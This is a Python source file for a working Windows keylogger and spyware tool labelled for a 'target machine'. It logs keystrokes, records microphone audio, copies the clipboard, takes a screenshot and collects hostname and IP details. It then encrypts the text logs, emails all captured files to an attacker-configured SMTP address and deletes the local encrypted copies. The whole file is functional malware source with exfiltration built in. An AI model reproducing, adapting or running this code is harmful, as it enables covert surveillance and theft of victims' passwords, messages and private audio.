# libraries
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket, platform

import win32clipboard

from pynput.keyboard import Key, Listener

import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from dotenv import load_dotenv

from urllib.request import urlopen
import re as r

script_directory = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(script_directory, "log.txt")
system_info_path = os.path.join(script_directory, "system_info.txt")
clipboard_path = os.path.join(script_directory, "clipboard.txt")
env_path = os.path.join(script_directory, ".env")
audio_file_path = os.path.join(script_directory,"audio.wav")
image_file_path = os.path.join(script_directory,"screenshot.png")
load_dotenv(env_path)

enc_log = os.path.join(script_directory,"enc-log.txt")
enc_system = os.path.join(script_directory,"enc-system.txt")
enc_clipboard = os.path.join(script_directory,"enc-clipboard.txt")

BUFFER_COUNT = 30
buffer = ""
keystroke_count = 0
line_count = 0
microphone_time = 10
fromAddress = os.getenv('FROM_EMAIL_ADDRESS')
host = os.getenv('HOST')
toAddress = os.getenv('TO_EMAIL_ADDRESS')
port = os.getenv('PORT')
api_key = os.getenv('API_KEY')
enc_key = os.getenv('ENC_KEY')
username = "api"

def send_email():
	email = prepare_email()
	print("Mail prepared...")

	try:
		with smtplib.SMTP(host, port) as server:
			server.starttls()
			server.login(username, api_key)
			server.sendmail(fromAddress, toAddress, email)
			print("Email sent successfully")
	except:
		print("Failed to send email")

def prepare_email():
	# Create a multipart message
	msg = MIMEMultipart()

	# Set the email headers
	msg['From'] = fromAddress
	msg['To'] = toAddress
	msg['Subject'] = "Keylogger logs"

	body = "Keylogger logs of target machine"

	# Add the body of the email
	msg.attach(MIMEText(body, 'plain'))

	attachment_paths = [enc_log, enc_clipboard, enc_system, audio_file_path, image_file_path]
	attachment_filenames = ["log.txt", "clipboard.txt", "system.txt", "audio.wav", "screenshot.png"]


	# Attach files to the email
	for path, filename in zip(attachment_paths, attachment_filenames):
		with open(path, 'rb') as attachment:
			# Create a MIMEBase object
			mime_base = MIMEBase('application', 'octet-stream')
			# Set the payload of the attachment
			mime_base.set_payload(attachment.read())
			# Encode the attachment using base64
			encoders.encode_base64(mime_base)
			# Add the filename to the attachment header
			mime_base.add_header('Content-Disposition', f'attachment; filename="{filename}"')
			# Attach the attachment to the message
			msg.attach(mime_base)

	# Return the message as a string
	return msg.as_string()

def on_press(key):
	global buffer, keystroke_count, line_count
	if hasattr(key, 'char'):
		buffer += str(key.char)
	elif key == Key.enter:
		buffer += "\n"
		line_count += 1
	elif key == Key.space:
		buffer += " "
	elif key == Key.backspace:
		buffer = buffer[:-1]
	keystroke_count += 1
	if keystroke_count > BUFFER_COUNT:
		write_log()

def info():
	return """\n\
=======================\n\
Text length : {0}\n\
No of lines : {1}\n\
=======================\n""".format(len(buffer), line_count + 1)

def microphone():
	freq = 44100
	recording = sd.rec(int(microphone_time * freq), samplerate = freq, channels = 2)
	sd.wait()
	write(audio_file_path, freq, recording)

def write_log():
	global keystroke_count, line_count, buffer
	with open(log_file_path,"a") as out:
		out.write(buffer)
		out.write(info())
	buffer = ""
	keystroke_count = 0
	line_count = 0

def getIP():
	d = str(urlopen('http://checkip.dyndns.com/').read())

	return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)

def write_system_info():
	with open(system_info_path,"w") as out:
		hostname = socket.gethostname()
		IP_addr = socket.gethostbyname(hostname)
		out.write("Hostname -> " + hostname + 
		"\nPrivate IP Address -> " + IP_addr + "\n")
		try:
			out.write("Public IP Address -> " + getIP() + "\n")
		except Exception:
			out.write("Failed to obtain public IP address" + "\n")
		out.write("Processor -> " + platform.processor() 
		+ "\nSystem -> " + platform.system() + ":" + platform.version()
		+ "\nMachine -> " + platform.machine()	
		)

def copy_clipboard():
	with open(clipboard_path,"w") as out:
		try:
			win32clipboard.OpenClipboard()
			copied_data = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			out.write("Clipboard data:\n" + copied_data)
		except:
			out.write("Clipboard cannot be copied")

def take_screenshot():
	image = ImageGrab.grab()
	image.save(image_file_path)

def remove_files():
    encrypted_files = [enc_log, enc_clipboard, enc_system] # modify this to delete more files
    for file_path in encrypted_files:
        try:
            os.remove(file_path)
            print(f"File '{file_path}' removed successfully.\n")
        except FileNotFoundError:
            print(f"File '{file_path}' not found.\n")
        except PermissionError:
            print(f"Permission denied: unable to remove file '{file_path}'.\n")
        except Exception as e:
            print(f"Error occurred while removing file '{file_path}': {e}\n")

def on_release(key):
	# break loop on pressing esc
	if key == Key.esc :
		write_log()
		print("Log written...")
		write_system_info()
		print("System info written...")
		copy_clipboard()
		print("Clipboard checked...")
		take_screenshot()
		print("Screenshot taken...")
		encrypt_files()
		print("Files encrypted")
		send_email()
		remove_files()
		print("Files removed")
		return False

def encrypt_files():
	files_to_encrypt = [log_file_path, clipboard_path, system_info_path]
	encrypted_files = [enc_log, enc_clipboard, enc_system]
	enc_idx = 0
	for file in files_to_encrypt:
		with open(file, 'rb') as f:
			data = f.read()
		
		fernet = Fernet(enc_key)
		encrypted = fernet.encrypt(data)
		
		with open(encrypted_files[enc_idx], 'wb') as f:
			f.write(encrypted)
		
		enc_idx += 1

print("Keylogger Started...")

# Define a function to run microphone() and listener.join() in parallel
def run_in_parallel():
	# Create a thread for microphone function
	microphone_thread = threading.Thread(target=microphone)
	microphone_thread.start()

	# Run listener.join() in the main thread
	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()

# Start the parallel execution
run_in_parallel()